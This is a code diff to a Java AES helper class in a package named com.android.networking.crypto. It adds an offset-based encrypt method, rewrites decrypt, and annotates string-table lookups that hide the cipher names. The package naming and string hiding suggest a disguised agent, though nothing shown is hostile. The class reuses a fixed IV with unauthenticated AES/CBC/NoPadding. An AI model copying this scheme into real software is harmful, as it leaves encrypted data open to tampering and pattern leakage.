@@ -9,9 +9,13 @@
 
 package com.android.networking.crypto;
 
+import java.security.InvalidAlgorithmParameterException;
+import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 
+import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
+import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
@@ -57,6 +61,7 @@ public class Crypto {
 	public Crypto(final byte[] key) throws NoSuchAlgorithmException, NoSuchPaddingException {
 		aes_key = new byte[key.length];
 		System.arraycopy(key, 0, aes_key, 0, key.length);
+		// 17.0=AES
 		skey_spec = new SecretKeySpec(aes_key, Messages.getString("17.0")); //$NON-NLS-1$
 
 		final byte[] iv = new byte[16];
@@ -66,7 +71,7 @@ public class Crypto {
 		}
 
 		ivSpec = new IvParameterSpec(iv);
-
+		// 17.1=AES/CBC/NoPadding
 		cipher = Cipher.getInstance(Messages.getString("17.1")); //$NON-NLS-1$
 	}
 
@@ -83,6 +88,12 @@ public class Crypto {
 
 		cipher.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
 		final byte[] encrypted = cipher.doFinal(clear);
+		return encrypted;
+	}
+
+	public byte[] encrypt(byte[] plain, int offset) throws IllegalBlockSizeException, BadPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
+		cipher.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
+		final byte[] encrypted = cipher.doFinal(plain, offset, plain.length - offset);
 		return encrypted;
 	}
 
@@ -109,55 +120,23 @@ public class Crypto {
 	 *            the encrypted
 	 * @param offset
 	 *            the offset
+	 * @param offset2 
 	 * @return the byte[]
 	 * @throws Exception
 	 *             the exception
 	 */
-	public byte[] decrypt(final byte[] encrypted, final int offset) throws Exception {
+	public byte[] decrypt(final byte[] encrypted, final int plainlen, int offset) throws Exception {
 		if (offset < 0 || encrypted.length < offset) {
 			return null;
 		}
 
 		// final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
 		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
-
-		if (offset == 0) {
-			return cipher.doFinal(encrypted);
-		} else {
-			final byte[] buffer = new byte[encrypted.length - offset];
-			System.arraycopy(encrypted, offset, buffer, 0, encrypted.length - offset);
-			return cipher.doFinal(encrypted);
-		}
-	}
-
-	// COMPAT
-	/**
-	 * Decrypt.
-	 * 
-	 * @param cypher
-	 *            the cypher
-	 * @param plain
-	 *            the plain
-	 */
-	public void decrypt(final byte[] cypher, final byte[] plain) {
-
-		try {
-			final byte[] buffer = decrypt(cypher);
-			if (Cfg.DEBUG) {
-				Check.asserts(plain.length == buffer.length, "different size buffers"); //$NON-NLS-1$
-			}
-
-			System.arraycopy(buffer, 0, plain, 0, buffer.length);
-		} catch (final Exception e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
-			}
-		}
-
+		byte[] plain= cipher.doFinal(encrypted, offset, encrypted.length - offset );
+		byte[] dst = new byte[plainlen];
+		System.arraycopy(plain, 0, dst, 0, plainlen);
+		return dst;
+		
 	}
 
 }
